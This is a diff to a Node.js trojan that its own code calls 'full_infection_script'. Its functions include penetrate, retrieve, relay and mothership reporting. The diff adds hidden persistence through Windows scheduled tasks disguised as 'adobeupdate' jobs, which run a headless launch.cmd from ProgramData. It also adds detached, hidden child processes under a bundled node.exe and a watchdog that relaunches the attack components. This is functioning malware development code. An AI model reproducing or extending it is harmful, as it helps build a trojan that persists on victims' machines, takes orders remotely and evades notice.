@@ -1,4 +1,4 @@
-debugger;
+// debugger;
 
 // https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce.com/
 // storagevault941@agentforce.com
@@ -9,8 +9,6 @@ debugger;
 // https://onecompiler.com/nodejs#draft-yf7t
 
 // TODO
-// !TEST!
-// anchor
 
 const path = require("path");
 module.paths.push(
@@ -28,18 +26,11 @@ const os = require("os");
 const crypto = require("crypto");
 const util = require("util");
 
-const ISDEBUG = true;
 
-// { CommandLine:'...', Name:'...', ProcessId:'...' }
-var processlist = null;
+const ISDEBUG = false; // only used for time delay mod
 
-initProcessList()
-    .then((result) => {
-        processlist = result;
-    })
-    .catch((err) => {
-        logmsg(err);
-    });
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
 
 // --- TESTING LIST ---
 // test vbs, bat, ps1 script job execution (EXEC_VBS, EXEC_BAT, EXEC_PS1 as well as execute_cmdlist method)
@@ -88,6 +79,19 @@ for (let token of process.argv) {
     if (!token.includes("--inspect-brk")) process_argv.push(token);
 }
 
+var taskconfig = {
+    get tasknames() {
+        return Object.keys(this.taskxmlfuncs);
+    },
+
+    taskxmlfuncs: {
+        IdleTask: getIdleTaskXMLStr,
+        RepTask: getRepTaskXMLStr,
+        TimeTask: getTimeTaskXMLStr,
+        DailyTask: getDailyTaskXMLStr,
+    },
+};
+
 var systemstate = {
     staticdelay: 30,
 
@@ -110,8 +114,12 @@ var systemstate = {
     script_version: "full_infection_script",
 
     get cmdname() {
-        if (process_argv.length >= 3) return process_argv[2];
-        else return "init";
+        let tcmdname = (process_argv.length >= 3) ? process_argv[2] : 'watchdog';
+
+        if ( tcmdname == 'launch_ping' )
+            tcmdname = 'watchdog';
+
+        return tcmdname;
     },
 
     __cmdconfig: null,
@@ -236,6 +244,18 @@ var systemstate = {
         return path.join(this.trojandir, "pcmon");
     },
 
+    get nodefolder() {
+        return "node-v26.4.0-win-x64";
+    },
+
+    get nodeexedir() {
+        return path.join(this.nodedir, this.nodefolder);
+    },
+
+    get nodeexepath() {
+        return path.join(this.nodeexedir, "node.exe");
+    },
+
     get nodedir() {
         return path.join(this.trojandir, "node");
     },
@@ -336,22 +356,17 @@ var systemstate = {
     },
 
     get logfpath() {
-        if (!isNullOrWhitespace(this.cmdtaskname))
-            return path.join(
-                this.trojandir,
-                "master_" +
-                    this.cmdname +
-                    "_" +
-                    this.cmdtaskname +
-                    "_" +
-                    this.scriptts +
-                    ".log"
-            );
-        else
-            return path.join(
-                this.trojandir,
-                "master_" + this.cmdname + "_" + this.scriptts + ".log"
-            );
+        return path.join(
+            this.trojandir,
+            "master_" +
+                this.cmdname +
+                (!isNullOrWhitespace(this.cmdtaskname)
+                    ? "_" + this.cmdtaskname
+                    : "") +
+                "_" +
+                this.scriptts +
+                ".log"
+        );
     },
 
     get lockfname() {
@@ -468,15 +483,17 @@ class CmdConfig {
 
     // list of supported commands
     static cmdfuncs = {
+        watchdog: watchdog,
+        task: watchdog,
+        launch_ping: watchdog,
+
         penetrate: penetrate,
         retrieve: retrieve,
-        watchdog: watchdog,
+        
         cmdlist: cmdlist,
         ping: ping,
         pcmon: pcmon,
         pspcmon: pspcmon,
-        init: startup,
-        task: startup,
         execjob: execjob,
         relay: relay,
         install_python: install_python,
@@ -508,7 +525,7 @@ class CmdConfig {
         return pid;
     }
 
-    activate(cmdlineargs, exitparent) {
+    async activate(cmdlineargs, exitparent) {
         logmsg("starting");
 
         if (!exitparent) exitparent = false;
@@ -524,32 +541,13 @@ class CmdConfig {
         let ispidalive = isPidAlive(tcmdpid);
 
         if (!ispidalive) {
-            this.launch();
-            logmsg("finished");
+            await this.launch(cmdlineargs, exitparent);
             return;
         }
 
-        let cmdprocess = getProcess(tcmdpid);
-        let procname = cmdprocess ? cmdprocess.Name.toLowerCase() : "UNKNOWN";
-        procname = path.basename(procname);
-
-        if (ispidalive) {
-            if (cmdprocess) {
-                let tlaunchprocname = path.basename(this.launchprocname);
-                if (!procname.includes(tlaunchprocname)) {
-                    // !TEST!
-                    this.launch(cmdlineargs, exitparent);
-                    logmsg("finished");
-                    return;
-                }
-            }
-        }
-
         logmsg(
-            `finished -- no need to launch -- [${this.cmdname}] cmd is running with pid=${tcmdpid} process name=${procname}`
+            `no need to launch -- [${this.cmdname}] cmd is running with pid=${tcmdpid}`
         );
-
-        logmsg("finished");
     }
 
     // message handler -- used by parent cmds to process incoming messages from child cmds
@@ -606,87 +604,84 @@ class CmdConfig {
         }
     }
 
-    launch(cmdlineargs, exitparent) {
+    async launch(cmdlineargs, exitparent) {
         if (!exitparent) exitparent = false;
 
-        logmsg("launching [" + this.cmdname + "]");
+        logmsg(`launching [${this.cmdname}] ${systemstate.trojanfpath}`);
 
         let child = null;
 
-        logmsg(`forking ${systemstate.trojanfpath}`);
-
-        let opts = {};
-
-        if (ISDEBUG) opts.execArgv = ["--inspect-brk"];
-
-        if (exitparent) {
-            opts.detached = true;
-            opts.stdio = "ignore";
-        }
-
-        if (!(Array.isArray(cmdlineargs) && cmdlineargs.length >= 1))
-            cmdlineargs = [];
+        cmdlineargs = !(Array.isArray(cmdlineargs) && cmdlineargs.length >= 1) ? [] : cmdlineargs;
 
         cmdlineargs = [this.cmdname, ...cmdlineargs];
 
-        if (!fileExists(systemstate.trojanfpath)) {
-            fs.copyFile(
-                systemstate.scriptfpath,
-                systemstate.trojanfpath,
-                (err) => {
-                    logmsg("ERROR: " + err);
-                }
-            );
-        }
+        return new Promise((resolve, reject) => {
 
-        if (!fileExists(systemstate.trojanfpath)) {
-            throw new Error(
-                "trojan script does not exists at " + systemstate.trojanfpath
-            );
-        }
+            if (!fileExists(systemstate.trojanfpath)) {
+                reject(new Error(
+                    "trojan script does not exists at " + systemstate.trojanfpath
+                ));
+            }
 
-        child = fork(systemstate.trojanfpath, cmdlineargs, opts);
+            // anchor
+            if (exitparent) {
+                logmsg('spawning child');
+                child = spawn(
+                    systemstate.nodeexepath,
+                    [systemstate.trojanfpath, ...cmdlineargs],
+                    { stdio: "ignore", windowsHide: true }
+                );
+            } else {
+                logmsg('forking child');
+                child = fork(systemstate.trojanfpath, cmdlineargs, {windowsHide: true});
+            }
 
-        this.#__childprocess = child;
-        this.#__launchprocname = path.basename(child.spawnargs[0]);
-        this.#__launchscriptfname = path.basename(systemstate.trojanfpath);
+            if ( ! child ) {
+                reject(new Error('failed to launch child proc'));
+            } else {
+                logmsg('child process launch success');
+            }
 
-        if (exitparent) {
-            child.disconnect();
             child.unref();
-        }
 
-        let tchildproc = getProcess(child.pid);
+            this.#__childprocess = child;
+            this.#__launchprocname = path.basename(child.spawnargs[0]);
+            this.#__launchscriptfname = path.basename(systemstate.trojanfpath);
 
-        logmsg(
-            `launched child ${this.cmdname} pid=${child.pid} spawn args: ` +
-                JSON.stringify(child.spawnargs)
-        );
-        // spawnargs: ["C:\\Program Files\\nodejs\\node.exe","C:\\Users\\sebas\\AppData\\Local\\Temp\\owd\\adobeupdate","penetrate"]
+            logmsg(
+                `launched child ${this.cmdname} pid=${child.pid} spawn args: ` +
+                    JSON.stringify(child.spawnargs)
+            );
+            // spawnargs: ["C:\\Program Files\\nodejs\\node.exe","C:\\Users\\sebas\\AppData\\Local\\Temp\\owd\\adobeupdate","penetrate"]
 
-        writeTag(this.cmdpidfpath, String(child.pid));
+            writeTag(this.cmdpidfpath, String(child.pid));
 
-        // incomming message from child process (sender:cmdlist, ping -- receiver: watchdog)
-        child.on("message", (message) => {
-            logmsg("[YER]incomming message: " + JSON.stringify(message));
+            // incomming message from child process (sender:cmdlist, ping -- receiver: watchdog)
+            child.on("message", (message) => {
+                logmsg("[YER]incomming message: " + JSON.stringify(message));
 
-            this.processMessage(message);
+                this.processMessage(message);
+            });
+
+            child.on("exit", (code) => {
+                logmsg(`Child process ${child.pid} exited with code ${code}`);
+            });
+
+            child.on("close", (code) => {
+                logmsg(`Process exited with code ${code}`);
+            });
+
+            child.on("error", (err) => {
+                logmsg("Failed to start child process:", err.message);
+                reject(err);
+            });
+
+            child.on('spawn', () => {
+                logmsg(`Child successfully started with PID: ${child.pid}`);
+
+                resolve(child);
+            });
         });
-
-        child.on("exit", (code) => {
-            logmsg(`Child process ${child.pid} exited with code ${code}`);
-        });
-
-        child.on("close", (code) => {
-            logmsg(`Process exited with code ${code}`);
-        });
-
-        child.on("error", (err) => {
-            logmsg("Failed to start child process:", err.message);
-        });
-
-        logmsg("finished");
-        return child;
     }
 
     exitramp() {
@@ -712,8 +707,6 @@ class CmdConfig {
 
     async loop() {
         logmsg("starting main looop");
-
-        const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
         if (!this.loopfunc) {
             logmsg("Fatal Error: loopfunc is not a valid function");
@@ -744,6 +737,7 @@ class CmdConfig {
                         systemstate.staticdelay
                     }]`
                 );
+
                 await sleep(1000);
             }
 
@@ -883,9 +877,9 @@ function isChildHealthy(childProcess) {
 }
 
 function ensureSingleInstancePipe(initfunc) {
-    logmsg("obtaining lock");
-
     const PIPE_NAME = "\\\\.\\pipe\\" + systemstate.lockfname;
+
+    logmsg(`obtaining lock  ${PIPE_NAME}`);
 
     const server = net.createServer();
 
@@ -898,7 +892,7 @@ function ensureSingleInstancePipe(initfunc) {
         }
     });
 
-    server.listen(PIPE_NAME, () => {
+    server.listen(PIPE_NAME, async () => {
         server.unref();
 
         if (initfunc) {
@@ -1109,6 +1103,8 @@ async function getProcessList_ps() {
 }
 
 async function initProcessList() {
+    logmsg("starting");
+
     let outproclist = [];
 
     try {
@@ -1142,10 +1138,12 @@ async function initProcessList() {
     }
 }
 
-function getProcess(pid) {
+async function getProcess(pid) {
     // CommandLine
     // Name
     // ProcessId
+
+    let processlist = await initProcessList();
 
     if (!processlist || processlist.length >= 1) {
         return null;
@@ -1174,8 +1172,7 @@ function getRandomCode(n) {
 }
 
 function isNullOrWhitespace(str) {
-    if (!(typeof str === "string"))
-        return false;
+    if (!(typeof str === "string")) return false;
 
     return !str || !str.trim();
 }
@@ -1204,9 +1201,9 @@ function logmsg(msgstr) {
     let callername = getCallerName();
     let msgout =
         "|" +
-        String(systemstate.cmdname) +
+        String(systemstate?.cmdname ?? "UNKNOWN") +
         "|" +
-        String(systemstate.scriptpid) +
+        String(systemstate?.scriptpid ?? "-1") +
         "|" +
         callername;
 
@@ -1217,7 +1214,9 @@ function logmsg(msgstr) {
     }
 
     console.log(msgout);
-    fs.appendFileSync(systemstate.logfpath, msgout + "\r\n", "utf8");
+
+    if (systemstate)
+        fs.appendFileSync(systemstate.logfpath, msgout + "\r\n", "utf8");
 }
 
 function getTimestamp() {
@@ -1555,35 +1554,17 @@ async function sendMessage(dest, msgpayload) {
 
 // ---
 
-function startup() {
-    logmsg("starting");
-
-    setcwd(systemstate.trojandir);
-
-    copyFile(systemstate.scriptfpath, systemstate.trojanfpath);
-
-    logmsg(`systemstate: [${systemstate.statestr}]`);
-    logMsgMothership(systemstate.statekvp);
-
-    let penetratecmd = new CmdConfig("penetrate");
-    let retrievecmd = new CmdConfig("retrieve");
-    let watchdogcmd = new CmdConfig("watchdog");
-
-    retrievecmd.launch();
-    penetratecmd.launch();
-    watchdogcmd.activate(null, true);
-
-    watchdogcmd.childprocess?.unref();
-    retrievecmd.childprocess?.unref();
-    penetratecmd.childprocess?.unref();
-
-    logmsg("finished");
-}
 
 function watchdog() {
     logmsg("starting");
 
     let watchdogcmd = systemstate.cmdconfig;
+
+    let penetratecmd = new CmdConfig("penetrate");
+    let retrievecmd = new CmdConfig("retrieve");
+
+    retrievecmd.launch(null, true);
+    penetratecmd.launch(null, true);
 
     watchdogcmd.newCmdConfig("ping");
     watchdogcmd.newCmdConfig("cmdlist");
@@ -1817,18 +1798,15 @@ function execPSScript(
 
     child.unref();
 
-    let tchildproc = getProcess(child.pid);
-
     // CommandLine
     // Name
     // ProcessId
 
     let spawnargsstr = JSON.stringify(child.spawnargs);
     let childpidstr = child.pid;
-    let childprocjson = JSON.stringify(tchildproc);
 
     logmsg(
-        `launched child pid=${childpidstr} spawn args: ${spawnargsstr} tchildproc: ${childprocjson}`
+        `launched child pid=${childpidstr} spawn args: ${spawnargsstr}`
     );
 
     logmsg("finished");
@@ -1898,18 +1876,15 @@ function execVBSScript(scriptfpath, cmdlineargsarr) {
 
     child.unref();
 
-    let tchildproc = getProcess(child.pid);
-
     // CommandLine
     // Name
     // ProcessId
 
     let spawnargsstr = JSON.stringify(child.spawnargs);
     let childpidstr = child.pid;
-    let childprocjson = JSON.stringify(tchildproc);
 
     logmsg(
-        `launched child pid=${childpidstr} spawn args: ${spawnargsstr} tchildproc: ${childprocjson}`
+        `launched child pid=${childpidstr} spawn args: ${spawnargsstr}`
     );
 
     logmsg("finished");
@@ -1975,18 +1950,15 @@ function execNODEScript(scriptfpath, cmdlineargsarr) {
 
     child.unref();
 
-    let tchildproc = getProcess(child.pid);
-
     // CommandLine
     // Name
     // ProcessId
 
     let spawnargsstr = JSON.stringify(child.spawnargs);
     let childpidstr = child.pid;
-    let childprocjson = JSON.stringify(tchildproc);
 
     logmsg(
-        `launched child pid=${childpidstr} spawn args: ${spawnargsstr} tchildproc: ${childprocjson}`
+        `launched child pid=${childpidstr} spawn args: ${spawnargsstr}`
     );
 
     logmsg("finished");
@@ -2056,18 +2028,16 @@ function execPYTHONScript(scriptfpath, cmdlineargsarr) {
 
     child.unref();
 
-    let tchildproc = getProcess(child.pid);
-
     // CommandLine
     // Name
     // ProcessId
 
     let spawnargsstr = JSON.stringify(child.spawnargs);
     let childpidstr = child.pid;
-    let childprocjson = JSON.stringify(tchildproc);
 
+    
     logmsg(
-        `launched child pid=${childpidstr} spawn args: ${spawnargsstr} tchildproc: ${childprocjson}`
+        `launched child pid=${childpidstr} spawn args: ${spawnargsstr}`
     );
 
     logmsg("finished");
@@ -2115,17 +2085,12 @@ function execCMDScript(scriptfpath, cmdlineargsarr) {
 
     child.unref();
 
-    let tchildproc = getProcess(child.pid);
-
     // CommandLine
     // Name
     // ProcessId
 
     logmsg(
-        `launched child pid=${child.pid} spawn args: ` +
-            JSON.stringify(child.spawnargs) +
-            " tchildproc: " +
-            JSON.stringify(tchildproc)
+        `launched child pid=${child.pid} spawn args: ` + JSON.stringify(child.spawnargs)
     );
 
     logmsg("finished");
@@ -2172,7 +2137,6 @@ function runpsrelay(pubnubo) {
         cwd: "",
     });
 
-    let tchildproc = getProcess(child.pid);
     // CommandLine
     // Name
     // ProcessId
@@ -2219,9 +2183,7 @@ function runpsrelay(pubnubo) {
 
     logmsg(
         `launched child pid=${child.pid} spawn args: ` +
-            JSON.stringify(child.spawnargs) +
-            " tchildproc: " +
-            JSON.stringify(tchildproc)
+            JSON.stringify(child.spawnargs)
     );
 
     // log event to mothership
@@ -2242,7 +2204,6 @@ function runnoderelay(pubnubo) {
         cwd: "",
     });
 
-    let tchildproc = getProcess(child.pid);
     // CommandLine
     // Name
     // ProcessId
@@ -2289,9 +2250,7 @@ function runnoderelay(pubnubo) {
 
     logmsg(
         `launched child pid=${child.pid} spawn args: ` +
-            JSON.stringify(child.spawnargs) +
-            " tchildproc: " +
-            JSON.stringify(tchildproc)
+            JSON.stringify(child.spawnargs)
     );
 
     // log event to mothership
@@ -2315,7 +2274,6 @@ function runbatrelay(pubnubo) {
 
     // child.unref();
 
-    let tchildproc = getProcess(child.pid);
     // CommandLine
     // Name
     // ProcessId
@@ -2356,9 +2314,7 @@ function runbatrelay(pubnubo) {
 
     logmsg(
         `launched child pid=${child.pid} spawn args: ` +
-            JSON.stringify(child.spawnargs) +
-            " tchildproc: " +
-            JSON.stringify(tchildproc)
+            JSON.stringify(child.spawnargs)
     );
 
     // log event to mothership
@@ -2711,7 +2667,6 @@ function validateTask(taskdetail) {
 }
 
 // TODO
-// anchor
 async function reschedule() {
     let tasknames = taskconfig.tasknames;
 
@@ -2722,11 +2677,10 @@ async function reschedule() {
         let taskdetail = null;
 
         if (ptasknames.includes(taskname)) {
-            logmsg(`task {taskname} registered`);
+            logmsg(`task ${taskname} registered`);
             taskdetail = await getTaskDetail(taskname);
 
-            if ( ! validateTask(taskdetail) )
-                await createTask(taskname);
+            if (!validateTask(taskdetail)) await createTask(taskname);
 
             continue;
         } else {
@@ -2778,7 +2732,7 @@ cmdstr = "REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Run
 async function invoke_exe(
     exename,
     targs = null,
-    exedirpath = "", 
+    exedirpath = "",
     stdoutfunc,
     stderrfunc,
     closefunc,
@@ -2790,13 +2744,13 @@ async function invoke_exe(
         let child = spawn(exePath, targs, {
             shell: true, // exename.slice(-4) == ".cmd",
             windowsHide: true,
-            stdio: 'pipe'
+            stdio: "pipe",
         });
 
         if (async) resolve(child);
 
-        if ( ! child ) {
-            throw new Error('failed to spawn child process');
+        if (!child) {
+            throw new Error("failed to spawn child process");
         }
 
         try {
@@ -3359,8 +3313,8 @@ async function retrieve() {
         console.log(`${localpath} -- File size: ${stats.size} bytes`);
     }
 
-    process.exit(0);
     logmsg("finished");
+    process.exit(0);
 }
 
 function cleanup() {
@@ -3584,20 +3538,9 @@ function logEventMothership(event_code, kvp) {
 
 // ---
 
-var taskconfig = {
-    get tasknames() {
-        return Object.keys(this.taskxmlfuncs);
-    },
-
-    taskxmlfuncs: {
-        IdleTask: getIdleTaskXMLStr,
-        RepTask: getRepTaskXMLStr,
-        TimeTask: getTimeTaskXMLStr,
-        DailyTask: getDailyTaskXMLStr,
-    },
-};
-
 async function getTasks() {
+    logmsg('starting');
+
     let tasknames = [];
     let taskstr = null;
     let ret = await invoke_exe(
@@ -3629,17 +3572,30 @@ async function getTasks() {
 }
 
 async function createTask(taskname) {
+    logmsg(`starting -- task ${taskname}`);
+
+    if ( ! taskconfig.tasknames.includes(taskname) ) {
+        throw new Error(`${taskname} is not supported`);
+    }
     
-    //anchor
     let taskxmlstrfunc = taskconfig["taskxmlfuncs"][taskname];
-    
-    let pexe = '';
-    let args = '';
-    let workdir = '';
 
-    let taskxmlstr = taskxmlstrfunc(taskname, '1999-07-25T12:00:00', pexe, args, workdir);
+    let pexe = "conhost.exe";
+    let args = "--headless C:\\ProgramData\\owd\\launch.cmd";
+    let workdir = "C:\\ProgramData\\owd\\";
 
-    let cleanXml = taskxmlstr.replace(/>\s+/g, '>').replace(/\s+</g, '<');
+    let tasktime = ["RepTask", "TimeTask"].includes(taskname) ? '1' : '5';
+
+    let taskxmlstr = taskxmlstrfunc(
+        "adobeupdate_" + taskname,
+        "1999-07-25T12:00:00",
+        tasktime,
+        pexe,
+        args,
+        workdir
+    );
+
+    let cleanXml = taskxmlstr.replace(/>\s+/g, ">").replace(/\s+</g, "<");
 
     let fpath = path.join(systemstate.trojandir, "owd_" + taskname + ".xml");
     fs.writeFileSync(fpath, cleanXml, "utf8");
@@ -3651,51 +3607,50 @@ async function exec_schtasks(taskxmlpath, taskname) {
     let ret = await invoke_exe("schtasks", [
         "/create",
         "/XML",
-        "\""+taskxmlpath+"\"",
+        '"' + taskxmlpath + '"',
         "/tn",
-        "\""+taskname+"\"",
+        '"' + taskname + '"',
         "/F",
     ]);
 }
 
-
 async function getTaskDetail(taskname) {
-
     let resultdict = {};
-    let taskstr = '';
+    let taskstr = "";
 
     // Last Run Time:                        1999-11-30 12:00:00 AM
     // Last Result:                          267011
     // schtasks /query /tn "\Microsoft\Windows\NlaSvc\WiFiTask" /fo LIST /v
 
-    let ret = await invoke_exe("schtasks", [
-        "/query",
-        "/tn",
-        taskname,
-        "/fo",
-        "LIST",
-        "/v" ],null,(stdout) => { taskstr += stdout});
+    let ret = await invoke_exe(
+        "schtasks",
+        ["/query", "/tn", taskname, "/fo", "LIST", "/v"],
+        null,
+        (stdout) => {
+            taskstr += stdout;
+        }
+    );
 
-    if ( isNullOrWhitespace(taskstr) ) {
-        throw new Error('could not generate task names from schtasks');
+    if (isNullOrWhitespace(taskstr)) {
+        throw new Error("could not generate task names from schtasks");
     }
 
-    const lines = taskstr.split(/\r?\n/); 
+    const lines = taskstr.split(/\r?\n/);
 
-    for ( let i = 0 ; i<lines.length; i++) {
+    for (let i = 0; i < lines.length; i++) {
         let line = lines[i];
-        let parts = line.split(':');
+        let parts = line.split(":");
 
-        if ( parts && parts.length > 1 ) {
-            let key = '';
-            let value = '';
+        if (parts && parts.length > 1) {
+            let key = "";
+            let value = "";
 
-            if ( parts[0] == 'Repeat' ) {
+            if (parts[0] == "Repeat") {
                 value = parts.pop().trim();
-                key = parts.join(':').trim();
+                key = parts.join(":").trim();
             } else {
                 key = parts[0].trim();
-                value = parts.splice(1).join(':').trim();
+                value = parts.splice(1).join(":").trim();
             }
 
             resultdict[key] = value;
@@ -3705,7 +3660,7 @@ async function getTaskDetail(taskname) {
     return resultdict;
 }
 
-function getIdleTaskXMLStr(intaskname, tasktimestr, pexe, args, workdir) {
+function getIdleTaskXMLStr(intaskname, tasktimestr, tskxmltime, pexe, args, workdir) {
     // tasktimestr --> 2005-01-01T00:08:00
     let taskxmlstr = `
         <?xml version="1.0" encoding="UTF-16" ?>
@@ -3728,7 +3683,7 @@ function getIdleTaskXMLStr(intaskname, tasktimestr, pexe, args, workdir) {
             <StartWhenAvailable>true</StartWhenAvailable>
             <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
             <IdleSettings>
-                <Duration>PT1M</Duration>
+                <Duration>PT${tskxmltime}M</Duration>
                 <WaitTimeout>PT1H</WaitTimeout>
                 <StopOnIdleEnd>false</StopOnIdleEnd>
                 <RestartOnIdle>false</RestartOnIdle>
@@ -3753,7 +3708,7 @@ function getIdleTaskXMLStr(intaskname, tasktimestr, pexe, args, workdir) {
     return taskxmlstr;
 }
 
-function getRepTaskXMLStr(intaskname, tskxmltime, pexe, args, workdir) {
+function getRepTaskXMLStr(intaskname, tasktimestr, tskxmltime, pexe, args, workdir) {
     let taskxmlstr = `
         <?xml version="1.0" encoding="UTF-16" ?>
         <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -3764,7 +3719,7 @@ function getRepTaskXMLStr(intaskname, tskxmltime, pexe, args, workdir) {
             </RegistrationInfo> 
             <Triggers> 
                 <CalendarTrigger> 
-                    <StartBoundary>2026-04-30T09:00:00</StartBoundary> 
+                    <StartBoundary>${tasktimestr}</StartBoundary> 
                     <Repetition> 
                         <Interval>PT${tskxmltime}M</Interval> 
                         <StopAtDurationEnd>false</StopAtDurationEnd> 
@@ -3805,7 +3760,7 @@ function getRepTaskXMLStr(intaskname, tskxmltime, pexe, args, workdir) {
     return taskxmlstr;
 }
 
-function getTimeTaskXMLStr(intaskname, timetaskxmltime, pexe, args, workdir) {
+function getTimeTaskXMLStr(intaskname, tasktimestr, timetaskxmltime, pexe, args, workdir) {
     let taskxmlstr = `
         <?xml version="1.0" encoding="UTF-16"?>
         <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -3816,7 +3771,7 @@ function getTimeTaskXMLStr(intaskname, timetaskxmltime, pexe, args, workdir) {
         </RegistrationInfo> 
         <Triggers> 
             <TimeTrigger> 
-                <StartBoundary>2008-09-01T03:00:00</StartBoundary> 
+                <StartBoundary>${tasktimestr}</StartBoundary> 
                 <Repetition> 
                 <Interval>PT${timetaskxmltime}M</Interval> 
                 </Repetition> 
@@ -3854,7 +3809,7 @@ function getTimeTaskXMLStr(intaskname, timetaskxmltime, pexe, args, workdir) {
     return taskxmlstr;
 }
 
-function getDailyTaskXMLStr(intaskname, tasktimestr, pexe, args, workdir) {
+function getDailyTaskXMLStr(intaskname, tasktimestr, timetaskxmltime, pexe, args, workdir) {
     let taskxmlstr = `
         <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
         <RegistrationInfo>
@@ -3864,10 +3819,10 @@ function getDailyTaskXMLStr(intaskname, tasktimestr, pexe, args, workdir) {
         </RegistrationInfo> 
         <Triggers>
             <CalendarTrigger>
-                <StartBoundary>2026-04-26T09:45:21</StartBoundary>
+                <StartBoundary>${tasktimestr}</StartBoundary>
                 <Enabled>true</Enabled>
                 <ScheduleByDay>
-                    <DaysInterval>1</DaysInterval>
+                    <DaysInterval>${timetaskxmltime}</DaysInterval>
                 </ScheduleByDay>
             </CalendarTrigger>
         </Triggers>
@@ -3965,3 +3920,4 @@ outgoing result
 
 
 */
+
